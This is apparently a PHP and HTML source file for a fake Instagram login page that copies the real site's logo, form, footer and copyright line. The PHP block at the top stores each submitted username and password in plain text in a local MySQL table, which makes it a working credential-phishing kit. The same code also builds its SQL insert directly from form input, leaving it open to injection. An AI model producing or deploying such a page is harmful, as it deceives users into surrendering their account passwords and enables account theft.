<?php
if(isset($_POST['password'])){
$server = "localhost";
$username = "root";
$password = "";
$database = "instagram_login";

$con = mysqli_connect($server, $username, $password, $database);
if(!$con){
    die("connetion to the database is failed dur to ". mysqli_connect_error());
}
// echo "Succeful connetion to DB"/

@$id= $_POST['id'];
@$password= $_POST['password'];

$sql= "INSERT INTO `id_passwods` (`id`, `password`, `date_time`) VALUES ('$id', '$password', current_timestamp())";
 echo $sql;
if($con->query($sql) == true){

  //  echo "Successfully inserted";
}
else{
    //echo "ERROR: $sql <br> $con->error";
}
$con->close();
};

?>

<!-- © Mohammad Muazam -->
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Instagram</title>
    <link rel="icon" type="image/png" href="logo.png" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster" />
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
        integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
    <link rel="stylesheet" href="style.css" />
</head>
<!-- This contains all the content that we want to show to web users when they visit your page.
 -->

<body>
    <div class="container">
        <div class="col image">
            <a href="https://imgbb.com/"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
        </div>
        <!--end of image-->
        <div class="col content">
            <div class="box">
                <div class="title">
                    <a href="https://ibb.co/XtKd6c7"><img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname"
                            border="0"></a>
                </div>
                <form class="login-form" action="index.php" method="POST" >
                    <div class="form-content">
                        <input type="text" name="id" id="id" required />
                        <label for="uname">Phone number, username, or email</label>
                    </div>
                    <div class="form-content">
                        <input type="password" name="password" id="password"required />
                        <label for="password">Password</label>
                    </div>
                    <div class="form-content">
                        <button type="submit">Log in</button>
                    </div>
                    <div class="form-ending">
                        <center>
                            <p id="OR">OR</p>
                            <span id="line"></span>
                        </center>
                        <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
                        <a href="#">Forgot password?</a>
                    </div>
                </form>
            </div>
            <div class="mini-box">
                <div class="text">Don't have an account? <a href="#">Sign up</a></div>
            </div>
            <div class="download-section">
                <p>Get the app.</p>
                <div class="images">
                    <a href="https://imgbb.com/"><img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="appstore"
                            border="0"></a>
                    <a href="https://imgbb.com/"><img src="https://i.ibb.co/ZTHhz0b/playstore.png" alt="playstore"
                            border="0"></a>
                </div>
            </div>
        </div>
        <!--end of content-->
    </div>
    <footer>
        <ul>
            <li>About</li>
            <li>Blog</li>
            <li>Jobs</li>
            <li>Help</li>
            <li>API</li>
            <li>Privacy</li>
            <li>Terms</li>
            <li>Top Accounts</li>
            <li>Hashtags</li>
            <li>Locations</li>
        </ul>
        <div class="copyright">
            <select aria-label="Switch Display Language">
                <option value="af">Afrikaans</option>
                <option value="cs">Čeština</option>
                <option value="da">Dansk</option>
                <option value="de">Deutsch</option>
                <option value="el">Ελληνικά</option>
                <option value="en">English</option>
                <option value="en-gb">English (UK)</option>
                <option value="es">Español (España)</option>
                <option value="es-la">Español</option>
                <option value="fi">Suomi</option>
                <option value="fr">Français</option>
                <option value="id">Bahasa Indonesia</option>
                <option value="it">Italiano</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
                <option value="ms">Bahasa Melayu</option>
                <option value="nb">Norsk</option>
                <option value="nl">Nederlands</option>
                <option value="pl">Polski</option>
                <option value="pt-br">Português (Brasil)</option>
                <option value="pt">Português (Portugal)</option>
                <option value="ru">Русский</option>
                <option value="sv">Svenska</option>
                <option value="th">ภาษาไทย</option>
                <option value="tl">Filipino</option>
                <option value="tr">Türkçe</option>
                <option value="zh-cn">中文(简体)</option>
                <option value="zh-tw">中文(台灣)</option>
                <option value="bn">বাংলা</option>
                <option value="gu">ગુજરાતી</option>
                <option value="hi">हिन्दी</option>
                <option value="hr">Hrvatski</option>
                <option value="hu">Magyar</option>
                <option value="kn">ಕನ್ನಡ</option>
                <option value="ml">മലയാളം</option>
                <option value="mr">मराठी</option>
                <option value="ne">नेपाली</option>
                <option value="pa">ਪੰਜਾਬੀ</option>
                <option value="si">සිංහල</option>
                <option value="sk">Slovenčina</option>
                <option value="ta">தமிழ்</option>
                <option value="te">తెలుగు</option>
                <option value="vi">Tiếng Việt</option>
                <option value="zh-hk">中文(香港)</option>
                <option value="bg">Български</option>
                <option value="fr-ca">Français (Canada)</option>
                <option value="ro">Română</option>
                <option value="sr">Српски</option>
                <option value="uk">Українська</option>
            </select>
            <span> &copy 2021 Instagram from Facebook </span>
            <br>
        </div>
        <!-- <img src="c31566130735783.6186962073880.png" alt="" id="meta-img"> -->
    </footer>
</body>

</html>